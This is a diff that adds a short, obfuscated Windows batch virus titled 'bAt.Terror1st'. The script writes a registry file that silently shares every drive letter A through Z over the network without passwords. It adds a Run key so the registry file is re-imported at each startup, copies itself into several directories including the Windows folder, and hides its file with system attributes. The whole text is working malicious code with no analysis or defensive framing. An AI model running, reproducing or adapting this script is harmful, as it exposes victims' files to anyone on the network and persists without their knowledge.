@@ -1,0 +1,33 @@
+: bAt.Terror1st By SAD1c
+@EchO oFf
+CTty NUL>nUL
+SeT [#]=KEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
+sEt §°§=%tEmP%\DbRegSet.REG
+SEt X=eChO
+iF %1==/RaDrW gOTo AdRw
+sET ^*-*^=a;C;D;e;f;G;H;I;j;K;L;M;N;O;P;q;R;s;t;u;V;W;x;y;Z
+AtTRiB -r -H -s %§°§%
+%X% REGEDIT4>%§°§%
+%X% [H%[#]%Network]>>%§°§%
+%X% "Installed"="1">>%§°§%
+%X% [H%[#]%Network\LanMan]>>%§°§%
+%X% "Flags"=dword:0072f954>>%§°§%
+FOr %%x In (%^*-*^%) dO CaLL %0 /RaDrW %%x>nUl
+%X%.>>%§°§%
+%X% [H%[#]%Run]>>%§°§%
+%X% "DataBaseRegSet"="ReGeDiT /S %§°§%">>%§°§%
+sEt X=*.ReG
+STarT /W rEGeDIt /s %§°§%>NuL
+foR %%T iN (%X% ..\%X% \%X% %PaTh%\%X% %wInDir%\%X%) Do cOPy %§°§% %%T
+aTtrIb +R +h +S %§°§%
+GoTo peND
+:AdRw
+%X% [H%[#]%Network\LanMan\T%2$]>>%§°§%
+%X% "Flags"=dword:00000302>>%§°§%
+%X% "Parm1enc"=hex: >>%§°§%
+%X% "Parm2enc"=hex: >>%§°§%
+%X% "Path"="%2:\\">>%§°§%
+%X% "Remark"="">>%§°§%
+%X% "Type"=dword:00000000>>%§°§%
+:peND
+ClS
